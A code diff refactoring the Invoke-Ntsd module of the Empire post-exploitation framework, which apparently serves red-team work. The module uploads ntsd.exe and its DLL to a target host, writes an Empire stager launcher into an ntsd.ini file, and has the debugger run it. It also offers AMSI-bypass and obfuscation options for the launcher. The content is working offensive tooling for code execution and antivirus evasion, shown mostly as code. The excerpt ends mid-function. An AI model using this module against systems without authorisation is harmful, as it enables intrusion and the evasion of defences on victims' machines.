@@ -1,176 +1,74 @@
 from __future__ import print_function
 
-from builtins import object
 from builtins import str
-
+from builtins import object
 from empire.server.common import helpers
+from typing import Dict
+
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
-    
-    def __init__(self, mainMenu, params=[]):
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
         
-        self.info = {
-            'Name': 'Invoke-Ntsd',
-            
-            'Author': ['james fitts'],
-            
-            'Description': ("Use NT Symbolic Debugger to execute Empire launcher code"),
-
-            'Software': '',
-
-            'Techniques': ['T1127'],
-
-            'Background': True,
-            
-            'OutputExtension': None,
-            
-            'NeedsAdmin': False,
-            
-            'OpsecSafe': False,
-            
-            'Language': 'powershell',
-            
-            'MinLanguageVersion': '2',
-            
-            'Comments': [""]
-        }
-        
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Agent': {
-                'Description': 'Agent to run module on.',
-                'Required': True,
-                'Value': ''
-            },
-            'UploadPath': {
-                'Description': r'Path to drop dll (C:\Users\Administrator\Desktop).',
-                'Required': False,
-                'Value': ''
-            },
-            'Listener': {
-                'Description': 'Listener to use.',
-                'Required': True,
-                'Value': ''
-            },
-            'UserAgent': {
-                'Description': 'User-agent string to use for the staging request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
-            },
-            'Proxy': {
-                'Description': 'Proxy to use for request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
-            },
-            'BinPath': {
-                'Description': 'Binary to set NTSD to debug.',
-                'Required': True,
-                'Value': "C:\\Windows\\System32\\calc.exe"
-            },
-            'Arch': {
-                'Description': 'Architecture the system is on.',
-                'Required': True,
-                'Value': 'x64'
-            },
-            'ProxyCreds': {
-                'Description': r'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
-                'Required': False,
-                'Value': 'default'
-            },
-            'Obfuscate': {
-                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
-                'Required': False,
-                'Value': 'False'
-            },
-            'ObfuscateCommand': {
-                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
-                'Required': False,
-                'Value': r'Token\All\1'
-            },
-            'AMSIBypass': {
-                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
-                'Required': False,
-                'Value': 'True'
-            },
-            'AMSIBypass2': {
-                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
-                'Required': False,
-                'Value': 'False'
-            }
-        }
-        
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-        
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]['Value'] = value
-    
-    def generate(self, obfuscate=False, obfuscationCommand=""):
-        
-        listenerName = self.options['Listener']['Value']
-        uploadPath = self.options['UploadPath']['Value'].strip()
-        bin = self.options['BinPath']['Value']
-        arch = self.options['Arch']['Value']
-        ntsd_exe_upload_path = uploadPath + "\\" + "ntsd.exe"
-        ntsd_dll_upload_path = uploadPath + "\\" + "ntsdexts.dll"
+        listener_name = params['Listener']
+        upload_path = params['UploadPath'].strip()
+        bin = params['BinPath']
+        arch = params['Arch']
+        ntsd_exe_upload_path = upload_path + "\\" + "ntsd.exe"
+        ntsd_dll_upload_path = upload_path + "\\" + "ntsdexts.dll"
         
         # staging options
-        userAgent = self.options['UserAgent']['Value']
-        proxy = self.options['Proxy']['Value']
-        proxyCreds = self.options['ProxyCreds']['Value']
+        user_agent = params['UserAgent']
+        proxy = params['Proxy']
+        proxy_creds = params['ProxyCreds']
         
         if arch == 'x64':
-            ntsd_exe = self.mainMenu.installPath + "data/module_source/code_execution/ntsd_x64.exe"
-            ntsd_dll = self.mainMenu.installPath + "data/module_source/code_execution/ntsdexts_x64.dll"
+            ntsd_exe = main_menu.installPath + "data/module_source/code_execution/ntsd_x64.exe"
+            ntsd_dll = main_menu.installPath + "data/module_source/code_execution/ntsdexts_x64.dll"
         elif arch == 'x86':
-            ntsd_exe = self.mainMenu.installPath + "data/module_source/code_execution/ntsd_x86.exe"
-            ntsd_dll = self.mainMenu.installPath + "data/module_source/code_execution/ntsdexts_x86.dll"
+            ntsd_exe = main_menu.installPath + "data/module_source/code_execution/ntsd_x86.exe"
+            ntsd_dll = main_menu.installPath + "data/module_source/code_execution/ntsdexts_x86.dll"
         
         # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "data/module_source/code_execution/Invoke-Ntsd.ps1"
+        module_source = main_menu.installPath + "data/module_source/code_execution/Invoke-Ntsd.ps1"
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
-            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
+            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
+            module_source = module_source.replace("module_source", "obfuscated_module_source")
         try:
-            f = open(moduleSource, 'r')
+            f = open(module_source, 'r')
         except:
-            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
+            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
             return ""
         
-        moduleCode = f.read()
+        module_code = f.read()
         f.close()
         
-        script = moduleCode
-        scriptEnd = ""
-        if not self.mainMenu.listeners.is_listener_valid(listenerName):
+        script = module_code
+        script_end = ""
+        if not main_menu.listeners.is_listener_valid(listener_name):
             # not a valid listener, return nothing for the script
-            print(helpers.color("[!] Invalid listener: %s" % (listenerName)))
+            print(helpers.color("[!] Invalid listener: %s" % (listener_name)))
             return ''
         else:
             
-            l = self.mainMenu.stagers.stagers['multi/launcher']
-            l.options['Listener']['Value'] = self.options['Listener']['Value']
-            l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
-            l.options['Proxy']['Value'] = self.options['Proxy']['Value']
-            l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
-            l.options['Obfuscate']['Value'] = self.options['Obfuscate']['Value']
-            l.options['ObfuscateCommand']['Value'] = self.options['ObfuscateCommand']['Value']
-            l.options['AMSIBypass']['Value'] = self.options['AMSIBypass']['Value']
-            l.options['AMSIBypass2']['Value'] = self.options['AMSIBypass2']['Value']
+            l = main_menu.stagers.stagers['multi/launcher']
+            l.options['Listener'] = params['Listener']
+            l.options['UserAgent'] = params['UserAgent']
+            l.options['Proxy'] = params['Proxy']
+            l.options['ProxyCreds'] = params['ProxyCreds']
+            l.options['Obfuscate'] = params['Obfuscate']
+            l.options['ObfuscateCommand'] = params['ObfuscateCommand']
+            l.options['AMSIBypass'] = params['AMSIBypass']
+            l.options['AMSIBypass2'] = params['AMSIBypass2']
             launcher = l.generate()
             
             if launcher == '':
                 print(helpers.color('[!] Error in launcher generation.'))
                 return ''
             else:
-                launcherCode = launcher.split(' ')[-1]
+                launcher_code = launcher.split(' ')[-1]
                 
                 with open(ntsd_exe, 'rb') as bin_data:
                     ntsd_exe_data = bin_data.read()
@@ -178,10 +76,10 @@ class Module(object):
                 with open(ntsd_dll, 'rb') as bin_data:
                     ntsd_dll_data = bin_data.read()
                 
-                exec_write = "Write-Ini %s \"%s\"" % (uploadPath, launcher)
-                code_exec = "%s\\ntsd.exe -cf %s\\ntsd.ini %s" % (uploadPath, uploadPath, bin)
-                ntsd_exe_upload = self.mainMenu.stagers.generate_upload(ntsd_exe_data, ntsd_exe_upload_path)
-                ntsd_dll_upload = self.mainMenu.stagers.generate_upload(ntsd_dll_data, ntsd_dll_upload_path)
+                exec_write = "Write-Ini %s \"%s\"" % (upload_path, launcher)
+                code_exec = "%s\\ntsd.exe -cf %s\\ntsd.ini %s" % (upload_path, upload_path, bin)
+                ntsd_exe_upload = main_menu.stagers.generate_upload(ntsd_exe_data, ntsd_exe_upload_path)
+                ntsd_dll_upload = main_menu.stagers.generate_upload(ntsd_dll_data, ntsd_dll_upload_path)
                 
                 script += "\r\n"
                 script += ntsd_exe_upload
